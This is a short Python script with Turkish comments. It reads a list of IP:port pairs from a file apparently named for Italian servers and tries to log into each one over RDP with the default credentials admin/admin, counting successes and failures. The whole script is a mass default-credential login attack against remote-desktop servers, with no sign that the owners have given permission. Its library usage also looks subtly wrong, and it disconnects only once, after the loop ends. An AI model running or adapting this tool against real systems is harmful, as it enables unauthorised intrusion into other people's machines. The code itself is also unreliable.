from pyrdp.rdp import RDP

# Giriş bilgileri
username = "admin"
password = "admin"

# IP ve port listesini oku
with open("italy.txt", "r") as file:
    lines = file.readlines()

total_servers = len(lines)
success_count = 0
failure_count = 0

# Her bir IP ve port için döngü
for index, line in enumerate(lines, start=1):
    ip, port = line.strip().split(":")
    print(f"Deneniyor: {ip}:{port} ({index}/{total_servers})")

    # RDP oturumu oluştur ve giriş yap
    rdp = RDP(ip, int(port), username, password)
    try:
        if rdp.connect():
            # Başarılı oturum açma
            success_count += 1
            print(f"Başarılı giriş: {ip}:{port}")
        else:
            # Başarısız oturum açma
            failure_count += 1
            print(f"Başarısız giriş: {ip}:{port}")
    except Exception as e:
        # Hata durumu
        failure_count += 1
        print(f"Giriş hatası: {ip}:{port} - Hata: {str(e)}")

    # İlerleme durumu
    print(f"Doğru: {success_count}, Yanlış: {failure_count}")

rdp.disconnect()
